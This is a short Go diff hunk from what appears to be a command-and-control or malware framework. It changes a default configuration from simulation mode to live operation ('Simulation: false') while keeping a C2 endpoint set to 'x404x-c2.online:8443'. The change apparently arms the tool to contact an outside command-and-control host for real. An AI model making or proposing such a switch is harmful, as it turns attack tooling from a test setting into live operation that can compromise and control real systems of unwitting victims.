@@ -30,5 +30,5 @@ type V28Config struct {
 }
 
 func DefaultV28Config() *V28Config {
-	return &V28Config{Enabled: true, Simulation: true, C2Endpoint: "x404x-c2.online:8443"}
+	return &V28Config{Enabled: true, Simulation: false, C2Endpoint: "x404x-c2.online:8443"}
 }
